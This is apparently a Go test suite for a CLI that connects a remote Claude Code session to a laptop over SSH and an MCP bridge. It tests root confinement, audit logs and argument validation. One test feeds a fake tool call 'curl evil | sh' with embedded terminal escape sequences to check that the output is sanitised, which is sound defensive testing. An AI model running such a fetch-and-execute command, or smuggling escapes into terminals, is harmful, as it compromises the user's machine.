package cli

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/EasyRunTech/easyrun-cli/internal/config"
)

// claudeHarness — harness + ssh/claude palsu + jembatan palsu di soket unix.
type claudeHarness struct {
	*harness
	t        *testing.T
	fake     string // FAKE_DIR: log ssh/claude, berkas ui-exit
	eb       string // FAKE_EB: $EASYBOX_HOME tiruan (soket jembatan)
	proj     string // root di laptop (path nyata)
	outside  string
	bin      string
	extra    map[string]string
	noClaude bool
	tty      bool
}

func newClaudeHarness(t *testing.T) *claudeHarness {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("attach/hand tidak didukung di Windows")
	}
	h := newHarness(t)
	h.loggedIn(t)
	self, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	ch := &claudeHarness{harness: h, t: t, fake: t.TempDir(), bin: t.TempDir(), tty: true}
	for _, n := range []string{"ssh", "claude"} {
		if err := os.Symlink(self, filepath.Join(ch.bin, n)); err != nil {
			t.Fatal(err)
		}
	}
	// Soket jembatan butuh path pendek (alamat soket unix ≤ 104 byte).
	ch.eb, err = os.MkdirTemp("", "eb")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(ch.eb) })
	if err := os.MkdirAll(filepath.Join(ch.eb, "hands"), 0o700); err != nil {
		t.Fatal(err)
	}
	proj := filepath.Join(h.home, "proj")
	ch.outside = filepath.Join(h.home, "luar")
	for _, d := range []string{proj, ch.outside} {
		if err := os.MkdirAll(d, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	_ = os.WriteFile(filepath.Join(proj, "a.txt"), []byte("isi-dalam\n"), 0o600)
	_ = os.WriteFile(filepath.Join(proj, "CLAUDE.md"), []byte("Aturan proyek uji\n"), 0o600)
	_ = os.WriteFile(filepath.Join(ch.outside, "b.txt"), []byte("rahasia-luar\n"), 0o600)
	if ch.proj, err = filepath.EvalSymlinks(proj); err != nil {
		t.Fatal(err)
	}
	if ch.outside, err = filepath.EvalSymlinks(ch.outside); err != nil {
		t.Fatal(err)
	}
	ch.extra = map[string]string{
		envFake: "1", "FAKE_DIR": ch.fake, "FAKE_EB": ch.eb, "PATH": os.Getenv("PATH"),
		// harus dibuang sebelum `claude mcp serve` dijalankan
		"ANTHROPIC_API_KEY": "kunci-rahasia-uji", "CLAUDE_CODE_OAUTH_TOKEN": "token-rahasia-uji",
	}
	h.a.Environ = func() []string {
		var env []string
		for k, v := range ch.extra {
			env = append(env, k+"="+v)
		}
		return env
	}
	h.a.LookPath = func(name string) (string, error) {
		if name == "claude" && ch.noClaude {
			return "", errors.New("tidak ada")
		}
		if name == "ssh" || name == "claude" {
			return filepath.Join(ch.bin, name), nil
		}
		return "", errors.New("tidak ada")
	}
	h.a.Getwd = func() (string, error) { return proj, nil }
	h.a.StdinIsTerminal = func() bool { return ch.tty }
	return ch
}

func (ch *claudeHarness) runCtx(ctx context.Context, args ...string) int {
	ch.stdout.Reset()
	ch.stderr.Reset()
	return ch.a.Run(ctx, args)
}

func (ch *claudeHarness) sshCalls() []sshCall {
	ch.t.Helper()
	f, err := os.Open(filepath.Join(ch.fake, "ssh.log"))
	if err != nil {
		return nil
	}
	defer f.Close()
	var out []sshCall
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		var c sshCall
		if err := json.Unmarshal(sc.Bytes(), &c); err != nil {
			ch.t.Fatal(err)
		}
		out = append(out, c)
	}
	return out
}

func (ch *claudeHarness) uiExit(code string) {
	_ = os.WriteFile(filepath.Join(ch.fake, "ui-exit"), []byte(code), 0o600)
}

// bridgeConn — satu sambungan tangan dilihat dari jembatan palsu.
type bridgeConn struct {
	t     *testing.T
	c     net.Conn
	r     *bufio.Reader
	hello map[string]any
	nid   int
}

func (b *bridgeConn) send(v any) {
	raw, _ := json.Marshal(v)
	_, _ = b.c.Write(append(raw, '\n'))
}

func (b *bridgeConn) rpc(method string, params any) map[string]any {
	b.nid++
	id := "eb-" + strconv.Itoa(b.nid)
	b.send(map[string]any{"jsonrpc": "2.0", "id": id, "method": method, "params": params})
	_ = b.c.SetReadDeadline(time.Now().Add(10 * time.Second))
	for {
		line, err := b.r.ReadBytes('\n')
		if err != nil {
			b.t.Errorf("jembatan palsu: tidak ada jawaban %s: %v", method, err)
			return nil
		}
		var m map[string]any
		if json.Unmarshal(line, &m) == nil && m["id"] == id {
			return m
		}
	}
}

func (b *bridgeConn) handshake() []string {
	b.rpc("initialize", map[string]any{"protocolVersion": "2025-06-18", "capabilities": map[string]any{}})
	b.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"})
	r := b.rpc("tools/list", map[string]any{})
	var names []string
	if r != nil {
		for _, tl := range r["result"].(map[string]any)["tools"].([]any) {
			names = append(names, tl.(map[string]any)["name"].(string))
		}
	}
	return names
}

func (b *bridgeConn) call(name string, args map[string]any) (bool, string) {
	r := b.rpc("tools/call", map[string]any{"name": name, "arguments": args})
	res, _ := r["result"].(map[string]any)
	isErr, _ := res["isError"].(bool)
	var sb strings.Builder
	cs, _ := res["content"].([]any)
	for _, c := range cs {
		s, _ := c.(map[string]any)["text"].(string)
		sb.WriteString(s)
	}
	return isErr, sb.String()
}

// serveBridge — jembatan palsu di $FAKE_EB/hands/<pane>.sock; sambungan ke-i
// dilayani handlers[min(i, n-1)]. Mengembalikan jumlah sambungan.
func (ch *claudeHarness) serveBridge(pane string, handlers ...func(*bridgeConn)) func() int {
	t := ch.t
	l, err := net.Listen("unix", filepath.Join(ch.eb, "hands", pane+".sock"))
	if err != nil {
		t.Fatal(err)
	}
	var mu sync.Mutex
	n := 0
	var wg sync.WaitGroup
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			mu.Lock()
			i := n
			n++
			mu.Unlock()
			hf := handlers[min(i, len(handlers)-1)]
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer c.Close()
				b := &bridgeConn{t: t, c: c, r: bufio.NewReader(c)}
				_ = c.SetReadDeadline(time.Now().Add(10 * time.Second))
				line, err := b.r.ReadBytes('\n')
				if err != nil || json.Unmarshal(line, &b.hello) != nil {
					t.Errorf("jembatan palsu: hello tidak terbaca: %v %q", err, line)
					return
				}
				hf(b)
			}()
		}
	}()
	t.Cleanup(func() { _ = l.Close(); wg.Wait() })
	return func() int { mu.Lock(); defer mu.Unlock(); return n }
}

func drain(b *bridgeConn) {
	_ = b.c.SetReadDeadline(time.Now().Add(30 * time.Second))
	_, _ = io.Copy(io.Discard, b.r)
}

func remoteIs(c sshCall, words ...string) bool {
	return strings.Join(c.Remote, " ") == strings.Join(words, " ")
}

func has(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}

// TestClaudeAttachAlurLengkap — preflight → satu master → version → ensure →
// ls → tangan (lewat master) → UI `ssh -t` → UI keluar → tangan lepas →
// `-O exit` → ringkasan. Semua saluran harus memakai ControlPath yang sama.
func TestClaudeAttachAlurLengkap(t *testing.T) {
	ch := newClaudeHarness(t)
	type got struct {
		names      []string
		e1, e2, e3 bool
		t1, t2     string
		hello      map[string]any
	}
	var mu sync.Mutex
	var g got
	ch.serveBridge("w1", func(b *bridgeConn) {
		names := b.handshake()
		e1, t1 := b.call("Read", map[string]any{"file_path": ch.proj + "/a.txt"})
		e2, t2 := b.call("Read", map[string]any{"file_path": ch.outside + "/b.txt"})
		e3, _ := b.call("Bash", map[string]any{"command": "pwd"})
		mu.Lock()
		g = got{names: names, e1: e1, e2: e2, e3: e3, t1: t1, t2: t2, hello: b.hello}
		mu.Unlock()
		ch.uiExit("0")
		drain(b)
	})
	code := ch.runCtx(context.Background(), "claude", "uji-box", "w1", "attach")
	if code != 0 {
		t.Fatalf("kode %d\n%s", code, ch.stderr)
	}
	mu.Lock()
	defer mu.Unlock()
	if strings.Join(g.names, ",") != "Bash,Read,Edit,Write" {
		t.Errorf("tools/list ke box: %v", g.names)
	}
	if g.e1 || !strings.Contains(g.t1, "isi-dalam") {
		t.Errorf("Read di dalam root: %v %q", g.e1, g.t1)
	}
	if !g.e2 || !strings.Contains(g.t2, "di luar root") || strings.Contains(g.t2, "rahasia-luar") {
		t.Errorf("Read di luar root: %v %q", g.e2, g.t2)
	}
	if g.e3 {
		t.Error("Bash harus diteruskan")
	}
	if g.hello["root"] != ch.proj || g.hello["mode"] != "full" || g.hello["guard"] != "easyrun-cli/dev" ||
		g.hello["host"] != "laptop-budi.local" || g.hello["claude_version"] != "9.9.9 (Claude Code)" || g.hello["easybox_hand"] != float64(1) {
		t.Errorf("hello: %v", g.hello)
	}
	if md, _ := g.hello["claude_md"].(map[string]any); md[ch.proj+"/CLAUDE.md"] != "Aturan proyek uji\n" {
		t.Errorf("claude_md: %v", g.hello["claude_md"])
	}

	calls := ch.sshCalls()
	var masters []sshCall
	idx := map[string]int{}
	for i, c := range calls {
		if c.Opts["ControlMaster"] == "yes" {
			masters = append(masters, c)
		}
		switch {
		case c.Op == "exit":
			idx["exit"] = i
		case remoteIs(c, "easybox", "version"):
			idx["version"] = i
		case remoteIs(c, "easybox", "ensure", "default", "w1"):
			idx["ensure"] = i
		case remoteIs(c, "easybox-hand-connect", "w1", "--wait", "60"):
			idx["hand"] = i
			if !has(c.Flags, "-T") {
				t.Errorf("tangan harus -T: %v", c.Flags)
			}
		case remoteIs(c, "easybox", "attach-ui", "default", "w1"):
			idx["ui"] = i
			if !has(c.Flags, "-t") {
				t.Errorf("UI harus -t: %v", c.Flags)
			}
		}
	}
	if len(masters) != 1 {
		t.Fatalf("harus tepat satu master, dapat %d", len(masters))
	}
	m := masters[0]
	cp := m.Opts["ControlPath"]
	if !has(m.Flags, "-N") || m.Opts["BatchMode"] != "yes" || m.Opts["ControlPersist"] != "no" || !strings.Contains(m.Opts["ProxyCommand"], " tunnel "+boxID) {
		t.Errorf("master: %+v", m)
	}
	if len(cp)+controlTempSuffix >= sunPathMax {
		t.Errorf("ControlPath terlalu panjang (%d): %s", len(cp), cp)
	}
	if fi, err := os.Stat(filepath.Dir(cp)); err != nil || fi.Mode().Perm() != 0o700 {
		t.Errorf("folder ControlPath: %v %v", fi, err)
	}
	for _, c := range calls {
		if c.Opts["ControlPath"] != cp {
			t.Errorf("panggilan ssh tanpa master yang sama (sesi SSH kedua): %+v", c)
		}
		if c.Op == "" && c.Opts["ControlMaster"] != "yes" && c.Opts["ControlMaster"] != "no" {
			t.Errorf("perintah box tanpa ControlMaster=no: %+v", c)
		}
	}
	for _, k := range []string{"version", "ensure", "hand", "ui", "exit"} {
		if _, ok := idx[k]; !ok {
			t.Fatalf("panggilan %s tidak ada: %+v", k, calls)
		}
	}
	if !(idx["version"] < idx["ensure"] && idx["ensure"] < idx["hand"] && idx["ui"] < idx["exit"] && idx["hand"] < idx["exit"]) {
		t.Errorf("urutan salah: %v", idx)
	}
	if _, err := os.Lstat(cp); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("soket master masih ada: %v", err)
	}

	clog, _ := os.ReadFile(filepath.Join(ch.fake, "claude.log"))
	var cl map[string]any
	_ = json.Unmarshal(clog, &cl)
	if cl["cwd"] != ch.proj || cl["config"] != filepath.Join(ch.d.Path, claudeHandDir) || cl["api_key"] != false || cl["oauth"] != false {
		t.Errorf("claude mcp serve: %s", clog)
	}
	errs := ch.stderr.String()
	if !strings.Contains(errs, "3 panggilan tool, 1 ditolak penjaga") || !strings.Contains(errs, filepath.Join(ch.d.Path, claudeAuditFile)) || !strings.Contains(errs, "tangan laptop tersambung") {
		t.Errorf("ringkasan:\n%s", errs)
	}
	audit, err := os.ReadFile(filepath.Join(ch.d.Path, claudeAuditFile))
	if err != nil {
		t.Fatal(err)
	}
	if fi, _ := os.Stat(filepath.Join(ch.d.Path, claudeAuditFile)); fi.Mode().Perm() != 0o600 {
		t.Errorf("izin audit %v", fi.Mode().Perm())
	}
	as := string(audit)
	for _, want := range []string{"mulai box=contoh-box.easyrun.io pane=default:w1 root=" + ch.proj + " mode=full aksi=attach", "Read " + ch.proj + "/a.txt", `Bash "pwd"`, "tolak Read " + ch.outside, "selesai panggilan=3 ditolak=1"} {
		if !strings.Contains(as, want) {
			t.Errorf("audit tidak memuat %q:\n%s", want, as)
		}
	}
	if strings.Contains(as, "isi-dalam") {
		t.Error("audit memuat isi berkas")
	}
}

// TestClaudeHandSambungUlang — mode hand: sambungan pertama diputus jembatan
// sesudah jabat tangan → disambung ulang lewat master yang sama; Ctrl-C
// (ctx) → lepas dengan kode 0. Kode ensure 7 (jembatan di luar herdr) tetap
// boleh untuk hand.
func TestClaudeHandSambungUlang(t *testing.T) {
	ch := newClaudeHarness(t)
	ch.extra["FAKE_ENSURE_CODE"] = "7"
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	conns := ch.serveBridge("w1",
		func(b *bridgeConn) { b.handshake() },
		func(b *bridgeConn) {
			b.handshake()
			b.call("Read", map[string]any{"file_path": ch.proj + "/a.txt"})
			cancel()
			drain(b)
		})
	code := ch.runCtx(ctx, "claude", "uji-box", "w1", "hand", "--read-only")
	if code != 0 {
		t.Fatalf("kode %d\n%s", code, ch.stderr)
	}
	if conns() != 2 {
		t.Errorf("sambungan tangan %d, ingin 2", conns())
	}
	errs := ch.stderr.String()
	for _, want := range []string{"tersambung ke default:w1 — root " + ch.proj + " (mode read-only)", "✓ Read " + ch.proj + "/a.txt", "menyambung ulang dalam 1s", "1 panggilan tool, 0 ditolak"} {
		if !strings.Contains(errs, want) {
			t.Errorf("stderr tidak memuat %q:\n%s", want, errs)
		}
	}
	hands, masters := 0, 0
	for _, c := range ch.sshCalls() {
		if remoteIs(c, "easybox", "attach-ui", "default", "w1") {
			t.Error("mode hand tidak boleh membuka UI")
		}
		if c.Opts["ControlMaster"] == "yes" {
			masters++
		}
		if len(c.Remote) > 0 && c.Remote[0] == "easybox-hand-connect" {
			hands++
		}
	}
	if hands != 2 || masters != 1 {
		t.Errorf("hand-connect %d, master %d", hands, masters)
	}
}

// TestClaudeDigantikanTidakSambungUlang — jembatan memberi tahu "digantikan
// laptop lain" lalu menutup: tangan TIDAK menyambung ulang (tidak berebut).
func TestClaudeDigantikanTidakSambungUlang(t *testing.T) {
	ch := newClaudeHarness(t)
	conns := ch.serveBridge("w1", func(b *bridgeConn) {
		b.handshake()
		b.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/message", "params": map[string]any{"level": "warning", "data": "digantikan laptop lain"}})
		go func() { time.Sleep(2500 * time.Millisecond); ch.uiExit("0") }()
	})
	if code := ch.runCtx(context.Background(), "claude", "uji-box", "w1", "attach"); code != 0 {
		t.Fatalf("kode %d\n%s", code, ch.stderr)
	}
	if conns() != 1 {
		t.Errorf("tangan menyambung ulang setelah digantikan: %d sambungan", conns())
	}
	if !strings.Contains(ch.stderr.String(), "diambil alih laptop lain") {
		t.Errorf("ringkasan:\n%s", ch.stderr)
	}
}

func TestClaudeVersionDanEnsureGagal(t *testing.T) {
	cases := []struct {
		name string
		env  map[string]string
		want string
	}{
		{"claude belum terpasang", map[string]string{"FAKE_VERSION_JSON": `{"easybox_protocol":1,"easybox_version":"0.2.0","claude_path":null,"claude_version":null,"claude_logged_in":false,"herdr_version":"0.9"}`}, "Claude Code belum terpasang di box"},
		{"belum login", map[string]string{"FAKE_VERSION_JSON": `{"easybox_protocol":1,"easybox_version":"0.2.0","claude_path":"/x/claude","claude_version":"2","claude_logged_in":false,"herdr_version":"0.9"}`}, "belum login. Login sekali:\n  easyrun ssh uji-box\n  claude"},
		{"protokol baru", map[string]string{"FAKE_VERSION_JSON": `{"easybox_protocol":2}`}, "easyrun --self-update"},
		{"protokol lama", map[string]string{"FAKE_VERSION_JSON": `{"easybox_version":"0.1"}`}, "perbarui box"},
		{"tanpa herdr", map[string]string{"FAKE_VERSION_JSON": `{"easybox_protocol":1,"claude_path":"/x","claude_logged_in":true,"herdr_version":null}`}, "herdr tidak ada di box"},
		{"easybox tidak ada", map[string]string{"FAKE_VERSION_JSON": " ", "FAKE_VERSION_CODE": "127"}, "belum punya perintah `easybox`"},
		{"ensure belum login", map[string]string{"FAKE_ENSURE_CODE": "5"}, "belum login"},
		{"ensure di luar herdr", map[string]string{"FAKE_ENSURE_CODE": "7"}, "di luar herdr"},
		{"ensure tanpa herdr", map[string]string{"FAKE_ENSURE_CODE": "6"}, "herdr tidak tersedia"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ch := newClaudeHarness(t)
			for k, v := range c.env {
				ch.extra[k] = v
			}
			code := ch.runCtx(context.Background(), "claude", "uji-box", "w1", "attach")
			if code != 1 || !strings.Contains(ch.stderr.String(), c.want) {
				t.Fatalf("kode %d, stderr:\n%s\ningin memuat %q", code, ch.stderr, c.want)
			}
			exit := false
			for _, call := range ch.sshCalls() {
				exit = exit || call.Op == "exit"
				if len(call.Remote) > 0 && call.Remote[0] == "easybox-hand-connect" {
					t.Error("tangan tidak boleh dijalankan")
				}
			}
			if !exit {
				t.Error("master harus ditutup (-O exit)")
			}
		})
	}
}

func TestClaudeMasterGagal(t *testing.T) {
	ch := newClaudeHarness(t)
	ch.extra["FAKE_MASTER_FAIL"] = "easyrun: batas sesi SSH tercapai (untuk box ini, tenant, atau platform)"
	code := ch.runCtx(context.Background(), "claude", "uji-box", "w1", "attach")
	if code != 1 || !strings.Contains(ch.stderr.String(), "membuka sambungan SSH: ssh berhenti (kode 255) sebelum sambungan siap") || !strings.Contains(ch.stderr.String(), "batas sesi SSH tercapai") {
		t.Fatalf("kode %d\n%s", code, ch.stderr)
	}
	for _, c := range ch.sshCalls() {
		if len(c.Remote) > 0 {
			t.Errorf("perintah box dijalankan tanpa master: %+v", c)
		}
	}
}

// TestClaudePreflightLokal — semua gagal sebelum menyentuh jaringan.
func TestClaudePreflightLokal(t *testing.T) {
	cases := []struct {
		name string
		mut  func(*claudeHarness)
		args []string
		want string
	}{
		{"root = home", func(ch *claudeHarness) { ch.a.Getwd = func() (string, error) { return ch.home, nil } }, nil, "bukan / atau home"},
		{"root di folder config", func(ch *claudeHarness) {
			_ = os.MkdirAll(ch.d.Path+"/x", 0o700)
			ch.a.Getwd = func() (string, error) { return ch.d.Path + "/x", nil }
		}, nil, "folder rahasia"},
		{"claude tidak ada", func(ch *claudeHarness) { ch.noClaude = true }, nil, "Claude Code tidak ditemukan di laptop ini"},
		{"claude tanpa mcp serve", func(ch *claudeHarness) { ch.extra["FAKE_CLAUDE_NO_MCP"] = "1" }, nil, "`claude mcp serve` tidak jalan"},
		{"attach tanpa terminal", func(ch *claudeHarness) { ch.tty = false }, nil, "attach butuh terminal interaktif; tanpa terminal pakai: easyrun claude uji-box default:w1 hand"},
		{"windows", func(ch *claudeHarness) { ch.a.GOOS = "windows" }, nil, "belum didukung di Windows"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ch := newClaudeHarness(t)
			c.mut(ch)
			code := ch.runCtx(context.Background(), "claude", "uji-box", "w1", "attach")
			if code != 1 || !strings.Contains(ch.stderr.String(), c.want) {
				t.Fatalf("kode %d\n%s\ningin %q", code, ch.stderr, c.want)
			}
			if n := ch.p.total(); n != 0 {
				t.Errorf("%d panggilan ke panel sebelum preflight lolos", n)
			}
			if len(ch.sshCalls()) != 0 {
				t.Error("ssh dijalankan sebelum preflight lolos")
			}
		})
	}
}

func TestClaudeArgumen(t *testing.T) {
	ch := newClaudeHarness(t)
	bad := []struct {
		args []string
		want string
	}{
		{[]string{"claude"}, "nama box belum diisi"},
		{[]string{"claude", "uji-box"}, "aksi belum diisi"},
		{[]string{"claude", "uji-box", "w1"}, "aksi untuk pane w1 belum diisi"},
		{[]string{"claude", "uji-box", "w1", "jalan"}, `aksi "jalan" tidak dikenal`},
		{[]string{"claude", "uji-box", "a:b:c", "attach"}, "tidak valid"},
		{[]string{"claude", "uji-box", "w1;rm", "attach"}, "tidak valid"},
		{[]string{"claude", "uji-box", ":w1", "attach"}, "tidak valid"},
		{[]string{"claude", "uji-box", "ls", "--read-only"}, "hanya untuk attach dan hand"},
		{[]string{"claude", "uji-box", "w1", "attach", "--ngawur"}, "opsi tidak dikenal: --ngawur"},
		{[]string{"claude", "uji box", "ls"}, "tidak valid"},
	}
	for _, c := range bad {
		if code := ch.runCtx(context.Background(), c.args...); code != 2 || !strings.Contains(ch.stderr.String(), c.want) {
			t.Errorf("%v: kode %d, stderr %q, ingin %q", c.args, code, ch.stderr, c.want)
		}
	}
	if code := ch.runCtx(context.Background(), "claude", "--help"); code != 0 || !strings.Contains(ch.stdout.String(), "[<sesi>:]<pane> attach [--read-only] [--allow-home]") {
		t.Errorf("--help: %d\n%s", code, ch.stdout)
	}
	if ch.p.total() != 0 || len(ch.sshCalls()) != 0 {
		t.Error("argumen salah tidak boleh menyentuh jaringan")
	}
	ca, err := parseClaudeArgs([]string{"uji-box", "kerja:w2", "hand", "--allow-home"})
	if err != nil || ca.session != "kerja" || ca.pane != "w2" || !ca.allowHome || ca.action != "hand" {
		t.Errorf("parse: %+v %v", ca, err)
	}
}

// TestClaudeNamaPane — kontrak P2 "Nama" + Amandemen 6: karakter pertama sesi
// DAN pane huruf/angka, dicocokkan utuh (baris baru di akhir tidak lolos).
func TestClaudeNamaPane(t *testing.T) {
	long := "a" + strings.Repeat("b", 39)
	for _, bad := range []string{
		"default:-h", "default:-", "default:.", "default:..", "default:.x", "..:w1", ".:w1",
		".x", "..", "_a", "kerja:_a", "w1\n", "w1\nw2", "\nw1", long + "c", "default:" + long + "c", "w 1", "w1/..",
	} {
		if _, err := parseClaudeArgs([]string{"uji-box", bad, "attach"}); err == nil || !strings.Contains(err.Error(), "diawali huruf/angka") {
			t.Errorf("%q harus ditolak dengan pesan jelas, dapat %v", bad, err)
		}
	}
	if _, err := parseClaudeArgs([]string{"uji-box", "-x:w1", "attach"}); err == nil {
		t.Error("-x:w1 harus ditolak (sebagai opsi)")
	}
	for _, good := range []string{"a", "7", "w1.", "w1-", "w_1", "A.b-c_D", long, "kerja:" + long, "s1:p.2"} {
		ca, err := parseClaudeArgs([]string{"uji-box", good, "hand"})
		if err != nil {
			t.Errorf("%q harus diterima: %v", good, err)
			continue
		}
		if s, p, ok := strings.Cut(good, ":"); ok && (ca.session != s || ca.pane != p) {
			t.Errorf("%q: sesi %q pane %q", good, ca.session, ca.pane)
		}
	}
	ch := newClaudeHarness(t)
	if code := ch.runCtx(context.Background(), "claude", "uji-box", "default:-h", "attach"); code != 2 || !strings.Contains(ch.stderr.String(), "diawali huruf/angka") {
		t.Errorf("default:-h: kode %d, stderr %q", code, ch.stderr)
	}
	if len(ch.sshCalls()) != 0 || ch.p.total() != 0 {
		t.Error("nama salah tidak boleh menyentuh jaringan")
	}
}

func TestClaudeLsDanStop(t *testing.T) {
	ch := newClaudeHarness(t)
	ch.extra["FAKE_LS_JSON"] = `{"panes":[{"pane":"w2","session":null,"bridge_running":false,"started_at":null,"laptop":null},` +
		`{"pane":"w1","session":"main","bridge_running":true,"started_at":"2026-11-20 10:00:00 UTC","laptop":{"host":"laptop-kantor","user":"budi","root":"/home/budi/web","mode":"full","connected_at":"2026-11-20 10:01:00 UTC"}}]}`
	if code := ch.runCtx(context.Background(), "claude", "uji-box", "ls"); code != 0 {
		t.Fatalf("ls: %d %s", code, ch.stderr)
	}
	out := ch.stdout.String()
	lines := strings.Split(strings.TrimSpace(out), "\n")
	if len(lines) != 3 || !strings.HasPrefix(lines[0], "PANE") || !strings.HasPrefix(lines[1], "w1") || !strings.Contains(lines[1], "budi@laptop-kantor") ||
		!strings.Contains(lines[1], "/home/budi/web") || !strings.Contains(lines[1], " ya ") || !strings.Contains(lines[2], "tidak") {
		t.Errorf("tabel ls:\n%s", out)
	}
	calls := ch.sshCalls()
	if len(calls) != 1 || calls[0].Opts["ControlPath"] != "" || !remoteIs(calls[0], "easybox", "ls") || !has(calls[0].Flags, "-T") {
		t.Errorf("ls harus satu ssh exec tanpa master: %+v", calls)
	}
	ch.extra["FAKE_STOPPED"] = "true"
	if code := ch.runCtx(context.Background(), "claude", "uji-box", "kerja:w1", "stop"); code != 0 || !strings.Contains(ch.stdout.String(), "Claude di pane w1 dihentikan.") {
		t.Errorf("stop: %d %s %s", code, ch.stdout, ch.stderr)
	}
	ch.extra["FAKE_STOPPED"] = "false"
	if code := ch.runCtx(context.Background(), "claude", "uji-box", "w1", "stop"); code != 0 || !strings.Contains(ch.stdout.String(), "Tidak ada claude") {
		t.Errorf("stop tanpa claude: %d %s", code, ch.stdout)
	}
	ch.extra["FAKE_LS_JSON"] = `{"panes":[]}`
	if code := ch.runCtx(context.Background(), "claude", "uji-box", "ls"); code != 0 || !strings.Contains(ch.stdout.String(), "Belum ada pane claude") {
		t.Errorf("ls kosong: %s", ch.stdout)
	}
}

func TestControlPathPendek(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("unix")
	}
	long := config.Dir{Path: "/" + strings.Repeat("x", 120)}
	p, err := controlPath(long)
	if err != nil {
		t.Fatal(err)
	}
	if strings.HasPrefix(p, long.Path) || len(p)+controlTempSuffix >= sunPathMax {
		t.Errorf("folder config panjang harus pindah ke folder sementara: %s", p)
	}
	short := config.Dir{Path: t.TempDir()}
	if len(short.Path) < 60 {
		p, err := controlPath(short)
		if err != nil || filepath.Dir(p) != filepath.Join(short.Path, controlDirName) {
			t.Errorf("folder config pendek: %s %v", p, err)
		}
	}
	a, b := randomName(controlNameLen), randomName(controlNameLen)
	if a == b || len(a) != controlNameLen {
		t.Errorf("nama soket acak: %s %s", a, b)
	}
}

// TestClaudeBoxCmdDibatalkanBukanTimeout — Ctrl-C saat `easybox version`
// dilaporkan "dibatalkan", bukan "tidak selesai dalam 1m0s"; batas waktu
// sungguhan tetap dilaporkan sebagai batas waktu.
func TestClaudeBoxCmdDibatalkanBukanTimeout(t *testing.T) {
	ch := newClaudeHarness(t)
	ch.extra["FAKE_VERSION_SLEEP"] = "30s"
	conn := &boxConn{a: ch.a, sshPath: filepath.Join(ch.bin, "ssh"), env: ch.a.environ(), base: []string{"ssh"}, host: "uji"}

	_, err := conn.run(context.Background(), 300*time.Millisecond, "easybox", "version")
	if err == nil || !strings.Contains(err.Error(), "tidak selesai dalam 300ms") || errors.Is(err, context.Canceled) {
		t.Errorf("batas waktu: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	time.AfterFunc(300*time.Millisecond, cancel)
	_, err = conn.run(ctx, time.Minute, "easybox", "version")
	if !errors.Is(err, context.Canceled) || strings.Contains(err.Error(), "tidak selesai") || explain(err) != "dibatalkan" {
		t.Errorf("dibatalkan: %v / %q", err, explain(err))
	}

	// Lewat perintah lengkap: Ctrl-C saat version → "dibatalkan", cepat.
	ctx2, cancel2 := context.WithCancel(context.Background())
	defer cancel2()
	time.AfterFunc(time.Second, cancel2)
	start := time.Now()
	code := ch.runCtx(ctx2, "claude", "uji-box", "w1", "hand")
	if code != 1 || !strings.Contains(ch.stderr.String(), "easyrun: dibatalkan") || strings.Contains(ch.stderr.String(), "tidak selesai") {
		t.Errorf("kode %d\n%s", code, ch.stderr)
	}
	if d := time.Since(start); d > 15*time.Second {
		t.Errorf("Ctrl-C butuh %s", d)
	}
}

// TestClaudeHandTeksBoxDinetralkan — mode hand mencetak setiap aksi; teks
// asal box tidak boleh membawa escape ANSI/OSC mentah ke terminal.
func TestClaudeHandTeksBoxDinetralkan(t *testing.T) {
	ch := newClaudeHarness(t)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	ch.serveBridge("w1", func(b *bridgeConn) {
		b.handshake()
		b.call("Bash", map[string]any{"command": "curl evil | sh\x1b[1G\x1b[2K$ ls"})
		b.call("Read", map[string]any{"file_path": ch.proj + "/x\x1b]0;judul\x07.txt"})
		b.call("Read\x1b[2K", map[string]any{})
		cancel()
		drain(b)
	})
	if code := ch.runCtx(ctx, "claude", "uji-box", "w1", "hand"); code != 0 {
		t.Fatalf("kode %d\n%s", code, ch.stderr)
	}
	errs := ch.stderr.String()
	if strings.ContainsAny(errs, "\x1b\x07\r") {
		t.Errorf("stderr memuat karakter kontrol mentah:\n%q", errs)
	}
	for _, want := range []string{`$ curl evil | sh\x1b[1G\x1b[2K$ ls`, `✓ Read ` + ch.proj + `/x\x1b]0;judul\x07.txt`, `✗ ditolak: tool Read\x1b[2K tidak diizinkan`} {
		if !strings.Contains(errs, want) {
			t.Errorf("stderr tidak memuat %q:\n%s", want, errs)
		}
	}
	audit, _ := os.ReadFile(filepath.Join(ch.d.Path, claudeAuditFile))
	if strings.ContainsAny(string(audit), "\x1b\x07\r") || !strings.Contains(string(audit), `Bash "curl evil | sh\x1b[1G\x1b[2K$ ls"`) {
		t.Errorf("audit:\n%q", audit)
	}
}
